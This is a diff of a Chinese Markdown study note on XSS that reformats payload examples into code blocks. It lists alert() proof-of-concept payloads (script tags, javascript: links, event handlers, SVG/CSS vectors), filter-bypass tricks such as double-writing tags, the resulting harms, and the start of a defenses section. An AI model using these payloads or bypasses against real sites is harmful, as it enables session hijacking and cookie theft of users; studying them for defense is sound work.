@@ -14,47 +14,58 @@ DOM型XSS：存储区（URL/后端数据库/前端储存）；插入点（前端
 ### XSS平台：在线XSS平台或自己搭建的XSS平台
 ### beef软件
 ### XSS变形：
-** 1.利用<>构造html/JS:<script>alert(/xss/)</script> **</br>
-
+** 1.利用<>构造html/JS: **
+```
+<script>alert(/xss/)</script>
+```
 ** 2.伪协议方式构造XSS：** </br>
-<a href="javascript:alert(/xss/)>touch me</a></br>
-<a href="javascript:alert(/xss/)>touch me</a></br>
-
+```
+<a href="javascript:alert(/xss/)>touch me</a>
+<a href="javascript:alert(/xss/)>touch me</a>
+```
 ** 3.事件利用：** </br>
-<img src='./smile.jpg' onmouseover='alert(/xss/)'></br>
-<input type="text" onkeydown="alert(/xss/)"></br>
-<input type="text" onkeyup="alert(/xss/)"></br>
-<input type="button" onclick="alert(/xss/)"></br>
-<img src='#' onerror='alert(/xss/)'></br>
- 
+```
+<img src='./smile.jpg' onmouseover='alert(/xss/)'>
+<input type="text" onkeydown="alert(/xss/)">
+<input type="text" onkeyup="alert(/xss/)">
+<input type="button" onclick="alert(/xss/)">
+<img src='#' onerror='alert(/xss/)'>
+ ```
 ** 4.利用CSS触发XSS（过时）** </br>
 行内样式</br>
-<div style='backgroud-image:url(javascript(/xss/))'></br>
+```
+<div style='backgroud-image:url(javascript(/xss/))'>
+```
 页内样式</br>
-<style>=Body{backgroud-image:url(javascript(/xss/))}</style></br>
+  ```
+<style>=Body{backgroud-image:url(javascript(/xss/))}</style>
+```
 外部样式</br>
-<link rel="stylesheet" type="text/css" href="./xss.css"><div>hello<div></br>
-
+  ```
+<link rel="stylesheet" type="text/css" href="./xss.css"><div>hello<div>
+```
 ** 5.其他标签以及手法**</br>
+```
 <svg onload="alert(/xss/)"></br>
 <input onfocus=alert(/xss/) autofocus></br>
+```
 ### XSS绕过
-1.大小写转换</br>
-2.引号使用：HTML中对引号使用不敏感，但是过滤函数对引号很严格</br>
-3.左斜杠（/）代替空格</br>
-4.双写绕过：<scri<script>pt></br>
-5.对标签属性值进行转码，用来绕过过滤</br>
-6.拆分跨站</br>
-7.css中的变形
+（1）大小写转换</br>
+（2）引号使用：HTML中对引号使用不敏感，但是过滤函数对引号很严格</br>
+（3）左斜杠（/）代替空格</br>
+（4）双写绕过：<scri<script>pt></br>
+（5）对标签属性值进行转码，用来绕过过滤</br>
+（6）拆分跨站</br>
+（7）css中的变形
 
 ## 漏洞危害：
-1.窃取用户cookie，冒充用户身份进入网站</br>
-2.键盘记录</br>
-3.客户端信息探查</br>
-4.XSS getshell</br>
-5.劫持用户会话，执行任意操作</br>
-6.刷流量，执行弹窗广告</br>
-7.传播蠕虫病毒……
+（1）窃取用户cookie，冒充用户身份进入网站</br>
+（2）键盘记录</br>
+（3）客户端信息探查</br>
+（4）XSS getshell</br>
+（5）劫持用户会话，执行任意操作</br>
+（6）刷流量，执行弹窗广告</br>
+（7）传播蠕虫病毒……
 
 ## 漏洞防御：
 （1）使用XSS filter，过滤用户（客户端）提交的有害信息；</br>
